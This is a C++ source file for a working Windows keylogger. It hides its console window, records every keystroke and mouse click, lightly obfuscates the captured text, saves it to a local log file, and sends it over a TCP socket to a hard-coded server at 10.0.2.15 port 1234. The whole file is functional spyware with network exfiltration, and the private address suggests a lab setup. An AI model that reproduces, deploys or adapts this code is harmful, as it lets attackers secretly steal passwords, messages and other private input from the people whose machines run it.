#include<fstream>
#include <string.h>
#include<string>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>

using namespace std;

void log1(int);

void log2(int);

void log3(int);

char *fileName = "log.txt";

bool stilShifClicked, stilCapClicked, stilEscapeClicked,
        stilLCtrlClicked, stilRCtrlClicked, stilLAltClicked,
        stilRAltClicked, stilIf1Clicked, stilIf2Clicked, stilIf3Clicked,
        stilIf4Clicked, stilIf5Clicked, stilIf6Clicked, stilIf7Clicked,
        stilIf8Clicked, stilIf9Clicked, stilIf10Clicked, stilIf11Clicked,
        stilIf12Clicked;

// CAPSLOCK state
bool IsCapsLockUp;

SOCKET sckt;

void storeSpecialButton();
void sendtoServer(const string& keyValue);
void writeToFile(string);

int main() {


    ofstream out_file(fileName, ofstream::out);
    // Detach program from its console
    // to hide Console screen
    FreeConsole();
    // create file if not exist or clear it's data if it is exist
    //out_file.open(fileName);
    // Check CAPSLOCK state
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        IsCapsLockUp = true;
    else
        IsCapsLockUp = false;

    while (true) {

        storeSpecialButton();

        // Group #1 (SHIFT and CAPSLOCK keys have to be taken into consideration)

        // 65: <Aa>, 66: <Bb>, ..., 90: <Zz>
        for (int key = 65; key < 91; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log1(key);
            }
        }


        // Group #2 (Only the SHIFT key has to be taken into consideration)

        // 48: <0)>, 49: <1!>, ..., 57: <9(>
        for (int key = 48; key < 58; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log2(key);
            }
        }

        /*
        * 186: <;:>, 187: <=+>, 188: <,<>, 189: <-_>, 190: <.>>, 191: </?>,
        * 192: <`~>
        */
        for (int key = 186; key < 193; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log2(key);
            }
        }

        // 219: <[>, 220: <\|>, 221: <]}>, 222: <'">
        for (int key = 219; key < 223; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log2(key);
            }
        }

        // Group #3 (SHIFT and CAPSLOCK keys needn't be taken into consideration)

        // 1: LMB
        if (GetAsyncKeyState(1) == -32767) {
            log3(1);
        }

        // 2: RMB
        if (GetAsyncKeyState(2) == -32767) {
            log3(2);
        }

        // 4: MMB
        if (GetAsyncKeyState(4) == -32767) {
            log3(4);
        }

        // 8: BACK, 9: TAB
        for (int key = 8; key < 10; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }

        // 13: ENTER
        if (GetAsyncKeyState(13) == -32767) {
            log3(13);
        }

        // 16: SHIFT
        if (GetAsyncKeyState(16) == -32767) {
            log3(16);
        }

        // 20: CAPSLOCK
        if (GetAsyncKeyState(20) == -32767) {
            log3(20);
        }

        // 27: ESC
        if (GetAsyncKeyState(27) == -32767) {
            log3(27);
        }

        /*
        * 32: SPACE, 33: PGUP, 34: PGDN, 35: END, 36: HOME, 37: ARROWL, 38: ARROWU,
        * 39: ARROWR, 40: ARROWD
        */
        for (int key = 32; key < 41; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }

        // 45: INS, 46: DEL
        for (int key = 45; key < 47; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }

        // 91: LWIN, 92: RWIN, 93: MENU
        for (int key = 91; key < 94; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }

        // 112: F1, 113: F2, ..., 123: F12
        for (int key = 112; key < 124; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }

        // 162: LCTRL, 163: RCTRL, 164: LALT, 165: RALT
        for (int key = 162; key < 166; key++) {
            // If a key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                log3(key);
            }
        }
    }
    system("pause");
    return 0;
}


void log1(int key) {
    string keyValue = "";
    if (((!GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == false))
        || ((GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == true))) {
        //lower case
        key += 32;
    }

    keyValue.push_back((char) key);
    writeToFile(keyValue);
}


void log2(int key) {
    string keyValue = "";
    // Take 'SHIFT' key into account
    if (!GetAsyncKeyState(VK_SHIFT)) {
        switch (key) {
            // It can vary by keyboard.
            case 186:
                keyValue = ";";
                break;
                // It can vary by keyboard.
            case 187:
                keyValue = "=";
                break;
                // For any country/region.
            case 188:
                keyValue = ",";
                break;
                // It can vary by keyboard.
            case 189:
                keyValue = "-";
                break;
                // For any country/region.
            case 190:
                keyValue = ".";
                break;
                // It can vary by keyboard.
            case 191:
                keyValue = "/";
                break;
                // It can vary by keyboard.
            case 192:
                keyValue = "`";
                break;
                // It can vary by keyboard.
            case 219:
                keyValue = "[";
                break;
                // It can vary by keyboard.
            case 220:
                keyValue = "\\";
                break;
                // It can vary by keyboard.
            case 221:
                keyValue = "]";
                break;
                // It can vary by keyboard.
            case 222:
                keyValue = "\'";
                break;
                // 0 1 2 3 4 5 6 7 8 9 (For any country/region)
                // print number directlly
            default:
                keyValue.push_back((char) key);
        }
    } else {
        switch (key) {
            // It can vary by keyboard.
            case 48:
                keyValue = ")";
                break;
                // It can vary by keyboard.
            case 49:
                keyValue = "!";
                break;
                // It can vary by keyboard.
            case 50:
                keyValue = "@";
                break;
                // It can vary by keyboard.
            case 51:
                keyValue = "#";
                break;
                // It can vary by keyboard.
            case 52:
                keyValue = "$";
                break;
                // It can vary by keyboard.
            case 53:
                keyValue = "%";
                break;
                // It can vary by keyboard.
            case 54:
                keyValue = "^";
                break;
                // It can vary by keyboard.
            case 55:
                keyValue = "&";
                break;
                // It can vary by keyboard.
            case 56:
                keyValue = "*";
                break;
                // It can vary by keyboard.
            case 57:
                keyValue = "(";
                break;
                // It can vary by keyboard.
            case 186:
                keyValue = ":";
                break;
                // It can vary by keyboard.
            case 187:
                keyValue = "+";
                break;
                // It can vary by keyboard.
            case 188:
                keyValue = "<";
                break;
                // It can vary by keyboard.
            case 189:
                keyValue = "_";
                break;
                // It can vary by keyboard.
            case 190:
                keyValue = ">";
                break;
                // It can vary by keyboard.
            case 191:
                keyValue = "\?";
                break;
                // It can vary by keyboard.
            case 192:
                keyValue = "~";
                break;
                // It can vary by keyboard.
            case 219:
                keyValue = "{";
                break;
                // It can vary by keyboard.
            case 220:
                keyValue = "|";
                break;
                // It can vary by keyboard.
            case 221:
                keyValue = "}";
                break;
                // It can vary by keyboard.
            case 222:
                keyValue = "\"";
                break;
        }
    }
    writeToFile(keyValue);

}

/**
* Encompassing the following characters (US standard keyboard):
* [LMB] [RMB] [MMB] [BACK] [TAB] [ENTER\n] [SHIFT] [CAP0] [CAP1] [ESC] [SPACE ]
* [PGUP] [PGDN] [END] [HOME] [ARROWL] [ARROWU] [ARROWR] [ARROWD] [INS] [DEL]
* [LWIN] [RWIN] [MENU] [F1-F12] [LCTRL] [RCTRL] [LALT] [RALT]
*/
void log3(int key) {
    string keyValue = "";
    switch (key) {
        // Left Mouse Buttton
        case VK_LBUTTON:
            keyValue = "[LMB]";
            break;
            // Right Mouse Buttton
        case VK_RBUTTON:
            keyValue = "[RMB]";
            break;
            // Middle Mouse Buttton
        case VK_MBUTTON:
            keyValue = "[MMB]";
            break;
            // Backspace
        case VK_BACK:
            keyValue = "[BACK]";
            break;
            // Tab
        case VK_TAB:
            keyValue = "[TAB]";
            break;
            // Enter
        case VK_RETURN:
            keyValue = "[ENTER]\n";
            break;
            // Update CAPSLOCK state
        case VK_CAPITAL:
            if (IsCapsLockUp == true) {
                // C0 = CAPSLOCK Down
                keyValue = "[CAP0]";
                IsCapsLockUp = false;
            } else {
                // C1 = CAPSLOCK Up
                keyValue = "[CAP1]";
                IsCapsLockUp = true;
            }
            break;
            // Spacebar
        case VK_SPACE:
            keyValue = "[SPACE] ";
            break;
            // Page Up
        case VK_PRIOR:
            keyValue = "[PGUP]";
            break;
            // Page Down
        case VK_NEXT:
            keyValue = "[PGDN]";
            break;
            // End
        case VK_END:
            keyValue = "[END]";
            break;
            // Home
        case VK_HOME:
            keyValue = "[HOME]";
            break;
            // Left Arrow
        case VK_LEFT:
            keyValue = "[ARROWL]";
            break;
            // Up Arrow
        case VK_UP:
            keyValue = "[ARROWU]";
            break;
            // Right Arrow
        case VK_RIGHT:
            keyValue = "[ARROWR]";
            break;
            // Down Arrow
        case VK_DOWN:
            keyValue = "[ARROWD]";
            break;
            // Insert
        case VK_INSERT:
            keyValue = "[INS]";
            break;
            // Delete
        case VK_DELETE:
            keyValue = "[DEL]";
            break;
            // Left Windows
        case VK_LWIN:
            keyValue = "[LWIN]";
            break;
            // Right Windows
        case VK_RWIN:
            keyValue = "[RWIN]";
            break;
            // Application/Menu
        case VK_APPS:
            keyValue = "[MENU]";
            break;
    }
    writeToFile(keyValue);
}

void storeSpecialButton() {
    string keyValue = "";
    if (GetAsyncKeyState(VK_SHIFT)) {
        if (!stilShifClicked) {
            keyValue = "[SHIFT]";
        }
        stilShifClicked = true;
    } else {
        stilShifClicked = false;
    }
    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_ESCAPE)) {
        if (!stilEscapeClicked) {
            keyValue = "[ESC]";
        }
        stilEscapeClicked = true;
    } else {
        stilEscapeClicked = false;
    }
    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_LCONTROL)) {
        if (!stilLCtrlClicked) {
            keyValue = "[LCTRL]";
        }
        stilLCtrlClicked = true;
    } else {
        stilLCtrlClicked = false;
    }
    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_RCONTROL)) {
        if (!stilRCtrlClicked) {
            keyValue = "[RCTRL]";
        }
        stilRCtrlClicked = true;
    } else {
        stilRCtrlClicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_LMENU)) {
        if (!stilLAltClicked) {
            keyValue = "[LALT]";
        }
        stilLAltClicked = true;
    } else {
        stilLAltClicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_RMENU)) {
        if (!stilRAltClicked) {
            keyValue = "[RALT]";
        }
        stilRAltClicked = true;
    } else {
        stilRAltClicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F1)) {
        if (!stilIf1Clicked) {
            keyValue = "[F1]";
        }
        stilIf1Clicked = true;
    } else {
        stilIf1Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F2)) {
        if (!stilIf2Clicked) {
            keyValue = "[F2]";
        }
        stilIf2Clicked = true;
    } else {
        stilIf2Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F3)) {
        if (!stilIf3Clicked) {
            keyValue = "[F3]";
        }
        stilIf3Clicked = true;
    } else {
        stilIf3Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F4)) {
        if (!stilIf4Clicked) {
            keyValue = "[F4]";
        }
        stilIf4Clicked = true;
    } else {
        stilIf4Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F5)) {
        if (!stilIf5Clicked) {
            keyValue = "[F5]";
        }
        stilIf5Clicked = true;
    } else {
        stilIf5Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F6)) {
        if (!stilIf6Clicked) {
            keyValue = "[F6]";
        }
        stilIf6Clicked = true;
    } else {
        stilIf6Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F7)) {
        if (!stilIf7Clicked) {
            keyValue = "[F7]";
        }
        stilIf7Clicked = true;
    } else {
        stilIf7Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F8)) {
        if (!stilIf8Clicked) {
            keyValue = "[F8]";
        }
        stilIf8Clicked = true;
    } else {
        stilIf8Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F9)) {
        if (!stilIf9Clicked) {
            keyValue = "[F9]";
        }
        stilIf9Clicked = true;
    } else {
        stilIf9Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F10)) {
        if (!stilIf10Clicked) {
            keyValue = "[F10]";
        }
        stilIf10Clicked = true;
    } else {
        stilIf10Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F11)) {
        if (!stilIf11Clicked) {
            keyValue = "[F11]";
        }
        stilIf11Clicked = true;
    } else {
        stilIf11Clicked = false;
    }

    ////////////////////////////////////////////
    ///////////////////////////////////////////
    if (GetAsyncKeyState(VK_F12)) {
        if (!stilIf12Clicked) {
            keyValue = "[F12]";
        }
        stilIf12Clicked = true;
    } else {
        stilIf12Clicked = false;
    }

    writeToFile(keyValue);
}

void sendtoServer(const string& keyValue) {
    // check if socket is valid
    if (sckt == INVALID_SOCKET || sckt == 0) {
        // start wsa
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        // Create a socket
        sckt = socket(AF_INET, SOCK_STREAM, 0);
        if (sckt == INVALID_SOCKET) {
            cout << "Error creating socket: " << WSAGetLastError() << endl;
        }
        // connect to server
        SOCKADDR_IN addr;
        int sizeofaddr = sizeof(addr);
        addr.sin_addr.s_addr = inet_addr("10.0.2.15");
        addr.sin_port = htons(1234);
        addr.sin_family = AF_INET;
        int conn = connect(sckt, (SOCKADDR*)&addr, sizeofaddr);
        if (conn == SOCKET_ERROR) {
            cout << "Error connecting to server: " << WSAGetLastError() << endl;
            closesocket(sckt);
            WSACleanup();
        }
    }

    // send the string
    send(sckt, keyValue.c_str(), keyValue.size(), 0);
}

void writeToFile(string currKey) {
    string encryptedKey;
    for (int i = 0; i < currKey.length(); i++)
        encryptedKey.push_back(char(currKey[i] + 2));
    sendtoServer(encryptedKey);
    ofstream out_file(fileName, ofstream::out | ofstream::app);
    if (out_file.is_open()) {
        //out_file << currKey;
        out_file << encryptedKey;
        out_file.close();
    } else {
        exit(1);
    }
}
